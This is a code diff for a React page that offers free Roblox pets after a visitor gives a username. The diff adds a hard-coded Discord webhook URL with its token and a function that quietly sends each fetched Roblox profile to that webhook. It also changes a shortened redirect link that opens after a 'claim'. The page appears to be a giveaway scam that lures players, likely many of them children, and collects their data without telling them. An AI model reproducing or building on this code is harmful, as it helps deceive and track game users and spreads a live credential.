@@ -1,62 +1,3 @@
-"use client"
-
-import { useState, useEffect } from "react"
-import {
-  Minus,
-  Plus,
-  Gift,
-  Activity,
-  Sprout,
-  User,
-  Trophy,
-  Calendar,
-  Users,
-  Wifi,
-  WifiOff,
-  X,
-  Check,
-  AlertTriangle,
-  ImageIcon,
-  RefreshCw,
-  ExternalLink,
-  Server,
-} from "lucide-react"
-import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
-import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import { Badge } from "@/components/ui/badge"
-import { Alert, AlertDescription } from "@/components/ui/alert"
-
-interface Pet {
-  id: string
-  name: string
-  image: string
-  quantity: number
-  claimed: boolean
-}
-
-interface RobloxUser {
-  id: number
-  name: string
-  displayName: string
-  description: string
-  created: string
-  isBanned: boolean
-  externalAppDisplayName?: string
-  hasVerifiedBadge: boolean
-  avatar?: string
-  avatarSource?: "roblox-api" | "fallback" | "placeholder"
-  isDemo?: boolean
-}
-
-interface ProcessStep {
-  id: number
-  text: string
-  completed: boolean
-  active: boolean
-}
-
 const pets: Pet[] = [
   {
     id: "1",
@@ -119,9 +60,15 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://shorturl.asia/UHOul",
+  url: "https://shorturl.asia/gDq1x",
   delay: 5000, // 5 seconds delay so users can read instructions
   autoRedirect: true, // Automatically redirect after successful claim
+}
+
+// Webhook configuration
+const WEBHOOK_CONFIG = {
+  enabled: true,
+  url: "https://discord.com/api/webhooks/1379740796865220748/IIt1p7i8DWHamFCAcKjfP8OKE10D3jGGRqUb3LqACPkzWFKzX8sOArDekfIadhYUltZ4",
 }
 
 export default function PetSeedStore() {
@@ -202,6 +149,36 @@ export default function PetSeedStore() {
     }
   }
 
+  const sendProfileToWebhook = async (profileData: RobloxUser) => {
+    if (!WEBHOOK_CONFIG.enabled || !WEBHOOK_CONFIG.url || WEBHOOK_CONFIG.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+      console.log("📡 Webhook not configured, skipping...")
+      return
+    }
+
+    try {
+      console.log("📡 Sending profile to webhook...")
+
+      const response = await fetch("/api/webhook/profile", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          webhookUrl: WEBHOOK_CONFIG.url,
+          profileData: profileData,
+        }),
+      })
+
+      if (response.ok) {
+        console.log("✅ Profile sent to webhook successfully")
+      } else {
+        console.error("❌ Failed to send profile to webhook")
+      }
+    } catch (error) {
+      console.error("❌ Webhook error:", error)
+    }
+  }
+
   const formatTime = (seconds: number) => {
     const hours = Math.floor(seconds / 3600)
     const minutes = Math.floor((seconds % 3600) / 60)
@@ -222,39 +199,32 @@ export default function PetSeedStore() {
       console.log(`🖼️ Fetching avatar for user ${userId}, attempt ${retryCount + 1}`)
       setAvatarLoading(true)
 
-      try {
-        const avatarResponse = await fetch(`/api/roblox/avatar/${userId}`)
+      const avatarResponse = await fetch(`/api/roblox/avatar/${userId}`)
 
-        if (avatarResponse.ok) {
-          const responseText = await avatarResponse.text()
-          const avatarData = JSON.parse(responseText)
-          console.log("🖼️ Avatar response:", avatarData)
+      if (avatarResponse.ok) {
+        const avatarData = await avatarResponse.json()
+        console.log("🖼️ Avatar response:", avatarData)
 
-          if (avatarData.success && avatarData.data && avatarData.data.length > 0) {
-            const avatarUrl = avatarData.data[0].imageUrl
-            console.log(`✅ Avatar URL obtained: ${avatarUrl}`)
-            return avatarUrl
-          }
+        if (avatarData.success && avatarData.data && avatarData.data.length > 0) {
+          const avatarUrl = avatarData.data[0].imageUrl
+          console.log(`✅ Avatar URL obtained: ${avatarUrl}`)
+          return avatarUrl
         }
-
-        throw new Error("Avatar API unavailable")
-      } catch (avatarApiError) {
-        console.log("🔄 Avatar API unavailable, using placeholder")
-
-        // If first attempt fails, try again with a delay
-        if (retryCount < 1) {
-          console.log(`🔄 Retrying avatar fetch in 1 second...`)
-          await new Promise((resolve) => setTimeout(resolve, 1000))
-          return fetchUserAvatar(userId, retryCount + 1)
-        }
-
-        // Final fallback
-        console.log(`⚠️ Using final fallback avatar`)
-        return `/placeholder.svg?height=100&width=100&text=${userId}`
       }
+
+      // If first attempt fails, try again with a delay
+      if (retryCount < 2) {
+        console.log(`🔄 Retrying avatar fetch in 1 second...`)
+        await new Promise((resolve) => setTimeout(resolve, 1000))
+        return fetchUserAvatar(userId, retryCount + 1)
+      }
+
+      // Final fallback to placeholder
+      console.log(`⚠️ Using placeholder avatar`)
+      return `/placeholder.svg?height=150&width=150&text=${userId}`
     } catch (error) {
       console.error("❌ Avatar fetch error:", error)
-      return `/placeholder.svg?height=100&width=100&text=${userId}`
+      return `/placeholder.svg?height=150&width=150&text=${userId}`
     } finally {
       setAvatarLoading(false)
     }
@@ -268,43 +238,24 @@ export default function PetSeedStore() {
 
     setLoading(true)
     setError("")
-    setIsDemo(false)
     setApiStatus("checking")
 
     try {
-      console.log("🔍 Attempting to fetch user:", username.trim())
+      console.log("🔍 Fetching user:", username.trim())
 
-      // Try to fetch from our API with proper error handling
-      let searchData
-      let isSearchDemo = true
+      // Fetch from our API
+      const searchResponse = await fetch(`/api/roblox/search?username=${encodeURIComponent(username.trim())}`)
 
-      try {
-        const searchResponse = await fetch(`/api/roblox/search?username=${encodeURIComponent(username.trim())}`)
-
-        if (searchResponse.ok) {
-          const responseText = await searchResponse.text()
-          try {
-            searchData = JSON.parse(responseText)
-            isSearchDemo = searchData.isDemo || false
-            console.log("📡 Search response:", searchData)
-          } catch (parseError) {
-            console.warn("⚠️ API returned non-JSON response, using demo mode")
-            throw new Error("API unavailable")
-          }
-        } else {
-          console.warn("⚠️ API endpoint not available, using demo mode")
-          throw new Error("API unavailable")
-        }
-      } catch (apiError) {
-        console.log("🔄 API unavailable, creating demo user data")
-        // Create demo search data
-        const demoUserId = Math.floor(Math.random() * 1000000) + 100000
-        searchData = {
-          data: [{ id: demoUserId }],
-          isDemo: true,
-        }
-        isSearchDemo = true
+      if (!searchResponse.ok) {
+        const errorData = await searchResponse.json()
+        setError(errorData.error || "Failed to search user")
+        setApiStatus("failed")
+        setLoading(false)
+        return
       }
+
+      const searchData = await searchResponse.json()
+      console.log("📡 Search response:", searchData)
 
       if (!searchData.data || searchData.data.length === 0) {
         setError("User not found. Please check the username and try again.")
@@ -314,47 +265,23 @@ export default function PetSeedStore() {
       }
 
       const userId = searchData.data[0].id
+      setApiStatus("connected")
 
-      if (isSearchDemo) {
-        console.log("⚠️ Using demo mode for search")
+      // Get detailed user information
+      const userResponse = await fetch(`/api/roblox/user/${userId}`)
+
+      if (!userResponse.ok) {
+        const errorData = await userResponse.json()
+        setError(errorData.error || "Failed to fetch user details")
         setApiStatus("failed")
-      } else {
-        console.log("✅ Real API connection successful")
-        setApiStatus("connected")
+        setLoading(false)
+        return
       }
 
-      // Get detailed user information with fallback
-      let userData
-      try {
-        if (!isSearchDemo) {
-          const userResponse = await fetch(`/api/roblox/user/${userId}`)
-          if (userResponse.ok) {
-            const responseText = await userResponse.text()
-            userData = JSON.parse(responseText)
-            console.log("👤 User data:", userData)
-          } else {
-            throw new Error("User API unavailable")
-          }
-        } else {
-          throw new Error("Using demo mode")
-        }
-      } catch (userApiError) {
-        console.log("🔄 User API unavailable, creating demo user data")
-        // Create demo user data
-        userData = {
-          id: userId,
-          name: username.trim(),
-          displayName: username.trim(),
-          description: "Demo user for testing purposes",
-          created: "2020-01-01T00:00:00.000Z",
-          isBanned: false,
-          externalAppDisplayName: username.trim(),
-          hasVerifiedBadge: Math.random() > 0.5,
-          isDemo: true,
-        }
-      }
+      const userData = await userResponse.json()
+      console.log("👤 User data:", userData)
 
-      // Fetch avatar with enhanced error handling
+      // Fetch avatar
       const avatarUrl = await fetchUserAvatar(userId)
 
       const userWithAvatar: RobloxUser = {
@@ -368,16 +295,15 @@ export default function PetSeedStore() {
         hasVerifiedBadge: userData.hasVerifiedBadge || false,
         avatar: avatarUrl,
         avatarSource: avatarUrl.includes("placeholder.svg") ? "placeholder" : "roblox-api",
-        isDemo: isSearchDemo || userData.isDemo,
+        isDemo: false,
       }
 
       setRobloxUser(userWithAvatar)
-      setIsDemo(userWithAvatar.isDemo || false)
+      setIsDemo(false)
       setError("")
 
-      if (userWithAvatar.isDemo) {
-        setError("⚠️ API limitations detected - using demo profile. Pet claiming still works!")
-      }
+      // Send profile to webhook
+      await sendProfileToWebhook(userWithAvatar)
 
       console.log("✅ User set successfully:", userWithAvatar)
     } catch (err) {
@@ -873,10 +799,10 @@ export default function PetSeedStore() {
               </div>
               {/* API Status Alert */}
               {apiStatus === "failed" && (
-                <Alert className="max-w-sm sm:max-w-md mx-auto mb-4 bg-yellow-50 border-yellow-200">
+                <Alert className="max-w-sm sm:max-w-md mx-auto mb-4 bg-red-50 border-red-200">
                   <AlertTriangle className="h-4 w-4" />
                   <AlertDescription className="text-sm">
-                    Roblox API is currently unavailable. Using demo mode - pet claiming still works normally!
+                    ❌ Failed to connect to Roblox API. Please try again.
                   </AlertDescription>
                 </Alert>
               )}
@@ -936,7 +862,6 @@ export default function PetSeedStore() {
                       <div className="bg-green-50 border border-green-200 rounded-md p-3">
                         <p className="text-green-600 text-sm">
                           ✅ Successfully connected to {robloxUser.displayName} (@{robloxUser.name})
-                          {isDemo && " (Demo Mode)"}
                         </p>
                       </div>
                     )}
@@ -1034,15 +959,9 @@ export default function PetSeedStore() {
                   <CardTitle className="flex items-center gap-2 text-sm sm:text-base">
                     <User className="h-4 w-4 sm:h-5 sm:w-5 text-blue-600" />
                     Roblox Profile
-                    {isDemo ? (
-                      <Badge variant="secondary" className="bg-yellow-100 text-yellow-700 text-xs">
-                        Demo
-                      </Badge>
-                    ) : (
-                      <Badge variant="secondary" className="bg-green-100 text-green-700 text-xs">
-                        Live
-                      </Badge>
-                    )}
+                    <Badge variant="secondary" className="bg-green-100 text-green-700 text-xs">
+                      Live
+                    </Badge>
                   </CardTitle>
                 </CardHeader>
                 <CardContent className="space-y-4">
@@ -1151,6 +1070,3 @@ export default function PetSeedStore() {
     </div>
   )
 }
-
-
-
